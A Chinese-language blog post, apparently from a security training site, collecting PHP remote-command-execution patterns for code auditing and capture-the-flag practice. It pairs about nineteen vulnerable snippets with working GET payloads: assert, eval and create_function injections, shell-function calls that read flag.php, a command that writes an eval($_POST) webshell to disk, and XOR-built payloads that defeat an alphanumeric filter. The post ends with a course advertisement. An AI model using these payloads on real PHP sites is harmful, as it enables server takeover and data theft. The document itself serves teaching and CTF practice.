---
layout: post
title: "PHP命令执行集锦"
date: "2022-03-21T08:40:14.975Z"
---
PHP命令执行集锦
=========

代码审计总要遇到命令执行或者说RCE，打CTF的过程中难免不会碰见，毕竟PHP是世界上最好的语言，总结一下...

#### **前言**

代码审计总要遇到命令执行或者说RCE，打CTF的过程中难免不会碰见，毕竟**PHP是世界上最好的语言**，总结一下

#### **命令执行函数**

##### **E.g.1**

 <?php   
 error\_reporting(0);   
 show\_source(\_\_FILE\_\_);   
 $a = "$\_GET\[c\]";   
 $b = "$\_GET\[d\]";   
 $array\[0\] =$b;   
 $c = array\_map($a,$array);   
 ?> 

传入参数c和d，array\_map函数作用将**$a**作为函数，**$array**作为参数，构造paylaod

> ?c=assert&d=system(%27ls%27);

##### **E.g.2**

<?php  
error\_reporting(0);  
show\_source(\_\_FILE\_\_);  
$a = "$\_GET\[b\]";  
$b = create\_function('',$a);  
$b();  
?>

**create\_function** 函数会创建一个匿名函数（`lambda`样式），在第一个`echo`中显示出名字，并在第二个`echo`语句中执行了此函数。

$b = create\_function('',$a);

这里$a为函数，' '为参数

那么可以看作为

function lambda(){  
•   echo ' ' ;  
}

传入payload

> b= ;}phpinfo();/\*

在function函数中即

function lambda(){  
    echo ' ' ;}phpinfo();/\*  
}

后面的内容注释掉了，即执行命令

![image-20220307182804462.png](https://www.hetianlab.com/headImg.action?news=92804c82-428b-4e44-90a7-5dbe47bf31f7.png)

##### **E.g.3**

<?php  
error\_reporting(0);  
show\_source(\_\_FILE\_\_);  
$a = "$\_GET\[d\]";  
$b='print'.$a.';';  
$f = create\_function('$a',$b);  
$f($a)

跟上面一样，虽然有一点变形，但是再$b的打印上没有特殊之处，所以payload:

> d=1;}system(%27ls%27);/\*

一致。

![image-20220307182819293.png](https://www.hetianlab.com/headImg.action?news=6c9f2a83-d700-4f82-845d-a0190748b75b.png)

##### **E.g.4**

<?php  
error\_reporting(0);  
show\_source(\_\_FILE\_\_);  
$a = "$\_GET\[b\]";  
assert($a);  
?>

没什么特别之处，assert直接作为函数执行，payload:

> ?b=system(%27ls;%27)

##### **E.g.5**

<?php  
error\_reporting(0);  
show\_source(\_\_FILE\_\_);  
$a = "$\_GET\[b\]";  
$b = "$\_GET\[c\]";  
call\_user\_func($a,$b);  
?>

**call\_user\_func()**函数的特点，知道后面的后面的**$b**为参数，前面的**$a**为函数即可

payload:

> ?b=system&c=whoami

##### **E.g.6**

<?php  
error\_reporting(0);  
show\_source(\_\_FILE\_\_);  
$a = "$\_GET\[b\]";  
$b = array($\_GET\['c'\]);  
call\_user\_func\_array($a,$b);  
?>

payload:

> ?b=assert&c=system(%27whoami%27);

##### **E.g.7**

<?php  
error\_reporting(0);  
show\_source(\_\_FILE\_\_);  
$\_GET\['a'\]($\_GET\['b'\]);  
?>

传入参数a和b，一个作为函数执行，一个做位参数，构造payload:

> ?a=assert&b=system(%27ls%27)

##### **E.g.8**

<?php  
error\_reporting(0);  
show\_source(\_\_FILE\_\_);  
$a = "$\_GET\[b\]";  
eval($a);  
?>

一句话木马有没有很熟悉，直接get方式传参给**b**即可，payload:

> ?b=system("ls");

##### **E.g.9**

<?php  
show\_source(\_\_FILE\_\_);  
echo "<br>";  
echo '请输入一个a的值';  
echo "<br>";  
error\_reporting(0);  
$price = $\_GET\['a'\];  
$code = 'echo $name. '.'的美元价格是' .$price.'; ';  
$b = create\_function('$name',$code);  
$b('iphone');  
?>

基本上属于3的内容加强版，重点就是需要进行闭合，，代码变多了，payload没有出入，重点还是再**$code**的位置

payload:

> ?a=1;}system(%27ls%27);/\*

##### **E.g.10**

<?php  
show\_source(\_\_FILE\_\_);  
error\_reporting(0);  
$sort\_by = $\_GET\['sort\_by'\];  
$sorter = 'strnatcasecmp';  
$database = array('1234','4321');  
$sort\_function = ' return 1 \* ' . $sorter . '($a\["' . '"\] , $b\["' . $sort\_by . '"\]);';  
usort($database,create\_function('$a,$b',$sort\_function));  
?>

属于加强版本，**$sort\_function**的内容进行闭合，也就是**sort\_by**的参数值要实现闭合，构造payload:

> ?sort\_by=%27"\]);}system(%27whoami%27);/\*

![image-20220307182832977.png](https://www.hetianlab.com/headImg.action?news=5ef0f284-9d47-4004-bc5f-2101b16ef7a0.png)

##### **E.g.11**

<?php  
error\_reporting(0);  
show\_source(\_\_FILE\_\_);  
$a = "$\_GET\[c\]";  
$b = preg\_replace("/abc/e",$a,'abcd');  
var\_dump($b);  
?>

虽然加了正则，但是并没有什么卵用，假把式，payload:

> ?c=system(%27ls%27);

##### **E.g.12**

<?php  
show\_source(\_\_FILE\_\_);  
$commandExecution = "echo ";  
echo "<br>";  
system($commandExecution.$\_GET\['a'\]);  
echo "<br>";  
?> 

payload

> ?a=<\\?php\\%20\\@eval($\_POST\[a\])\\;%20\\?>%20>2.php

一句话木马写入2.php

![image-20220307182905992.png](https://www.hetianlab.com/headImg.action?news=5c36e2d9-db34-4d77-965a-3d3b3d8ffd2f.png)

也有其它解法直接进行命令执行。

##### **E.g.13**

<?php  
error\_reporting(0);  
show\_source(\_\_FILE\_\_);   
$a = "$\_GET\[c\]";  
echo "<br>";  
exec($a,$b);  
var\_dump($b);  
?

**exec()**函数直接执行命令，那么payload

> ?c=whoami

##### **E.g.14**

<?php  
error\_reporting(0);  
show\_source(\_\_FILE\_\_);  
$a = "$\_GET\[c\]";  
echo shell\_exec($a);  
?

函数的特性**shell\_exec**

> ?c=ls>2.txt

然后执行

> ?c=cat 2.txt

此时

![image-20220307182917048.png](https://www.hetianlab.com/headImg.action?news=e0334897-4365-4cd0-982b-8538e86fede5.png)

##### **E.g.15**

<?php  
error\_reporting(0);  
show\_source(\_\_FILE\_\_);  
$a = "$\_GET\[c\]";  
echo "<br>";  
echo \`$a\`;  
?>

看到echo以及传入的字符串，方法类似于上面的一道

> ?c=cat%20flag.php>3.txt

直接访问3.txt即可，或者

> ?c=cat%203.txt

##### **E.g.16**

<?php  
error\_reporting(0);  
show\_source(\_\_FILE\_\_);  
$a = "$\_GET\[c\]";  
passthru($a);  
?>

payload：

> ?c=cat%20flag.php

##### **E.g.17**

<?php  
error\_reporting(0);  
show\_source(\_\_FILE\_\_);   
$cmd=$\_GET\['c'\];   
$fd = popen($cmd, 'r');   
while($s=fgets($fd)){   
print\_r($s);   
}   
?>

payload

> ?c=cat%20flag.php

##### **E.g.18**

<?php  
  error\_reporting(0);  
  show\_source(\_\_FILE\_\_);   
  $command=$\_GET\['c'\];  
  $descriptorspec=array(   
    0=>array('pipe','r'),   
    1=>array('pipe','w'),  
    2=>array('pipe','w')   
  );  
  $handle=proc\_open($command,$descriptorspec,$pipes,NULL);  
  if(!is\_resource($handle)){  
    die('proc\_open failed');  
  }  
  while($s=fgets($pipes\[1\])){  
    print\_r($s);  
  }  
  while($s=fgets($pipes\[2\])){  
    print\_r($s);  
  }  
  fclose($pipes\[0\]);  
  fclose($pipes\[1\]);  
  fclose($pipes\[2\]);  
  proc\_close($handle);  
?>

payload

> ?c=cat%20flag.php

##### **E.g.19 无字母shell**

<?php  
include 'flag.php';  
if(isset($\_GET\['code'\])){  
  $code = $\_GET\['code'\];  
  if(strlen($code)>40){ //检测字符长度  
    die("Long.");  
  }  
  if(preg\_match("/\[A-Za-z0-9\]+/",$code)){ //限制字母和数字  
    die("NO.");  
  }  
  @eval($code); //$code的值要为非字母和数字  
}else{  
  highlight\_file(\_\_FILE\_\_);  
}  
//$hint = "php function getFlag() to get flag";  
?>

绕过正则，传入的参数中不能含有大小写字母以及数字，使用异或的当时绕过正则即可

> <?phpvar\_dump('#'^'|'); var\_dump('.'^'~');var\_dump('/'^'`'); var_dump('|'^'/'); var_dump('{'^'/'); $__=("#"^"|").("."^"~").("/"^"`").("|"^"/").("{"^"/");//变量$\_值为字符串'POST'?>

![image-20220307182951085.png](https://www.hetianlab.com/headImg.action?news=d846a152-8d52-4d0b-97e7-00ffccb96f5c.png)

**no.flag**中提示了flag在getflag()方法中，那么自然需要构造payload去调用getflag()方法，需要参数长度小于40且绕过正则，那么可以设想一下

> function getflag(){
> 
> xxxxxxxxxxxxxxxx
> 
> }
> 
> @eval($code);

函数的调用就是类似于上面的过程，那么eval在执行的过程中$code并不能直接执行，参考上面的**题7**那么我传入的code的参数的形式为$\_GET\[\]且需要调用**getFlag()**方法，因为考虑到需要无字母，所以结合异或，那么payload就是下面的内容：

> ?code=${"`{{{"^"?<>/"}["`"^"?"\]();&\_=getFlag
> 
> 或者
> 
> ?code=$="\`{{{"^"?<>/";${$}[\_](https://www.hetianlab.com/$%7B$_%7D%5B__%5D);&\_=getFlag

这里

//\_GET 的变形无字母shell

> $\_="\`{{{"^"?<>/";

![image-20220307184319718.png](https://www.hetianlab.com/headImg.action?news=71990efb-efed-455c-a5fc-642a4d2ce690.png)

#### **小结**

大佬请绕路，如有错误欢迎师傅们指出。

**实验推荐：PHP命令注入攻击（合天网安实验室）[点击进入实操>>](https://www.hetianlab.com/expc.do?ce=c9246cb4-e33e-4528-84d5-b7636ea753c1)**

**更多网安工具及学习资料，扫码免费领：**

**![](https://img2022.cnblogs.com/blog/1781781/202203/1781781-20220321155437781-302031916.png)**

合天智汇：合天网络靶场、网安实战虚拟环境